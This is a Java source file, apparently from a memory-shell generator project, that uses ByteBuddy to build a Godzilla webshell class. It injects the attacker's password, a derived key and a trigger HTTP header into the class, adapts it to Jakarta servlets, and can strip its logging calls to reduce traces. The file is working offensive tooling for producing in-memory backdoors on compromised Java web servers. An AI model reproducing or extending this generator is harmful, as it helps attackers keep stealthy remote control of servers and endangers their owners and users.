package com.reajason.javaweb.memshell;

import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FieldAccessor;
import net.bytebuddy.implementation.SuperMethodCall;
import net.bytebuddy.matcher.ElementMatchers;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.StringUtils;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator {
    private final ShellConfig shellConfig;
    private final GodzillaConfig godzillaConfig;

    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
        this.shellConfig = shellConfig;
        this.godzillaConfig = godzillaConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (godzillaConfig.getShellClass() == null) {
            throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
        }
        if (StringUtils.isBlank(godzillaConfig.getKey()) || StringUtils.isBlank(godzillaConfig.getPass())) {
            throw new IllegalArgumentException("godzillaConfig.getKey().isBlank() || godzillaConfig.getPass().isBlank()");
        }
        String md5Key = DigestUtils.md5Hex(godzillaConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(godzillaConfig.getPass() + md5Key).toUpperCase();

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(godzillaConfig.getShellClass())
                .name(godzillaConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .constructor(ElementMatchers.any())
                .intercept(SuperMethodCall.INSTANCE
                        .andThen(FieldAccessor.ofField("pass").setsValue(godzillaConfig.getPass()))
                        .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
                        .andThen(FieldAccessor.ofField("md5").setsValue(md5))
                        .andThen(FieldAccessor.ofField("headerName").setsValue(godzillaConfig.getHeaderName()))
                        .andThen(FieldAccessor.ofField("headerValue").setsValue(godzillaConfig.getHeaderValue())));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }
        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}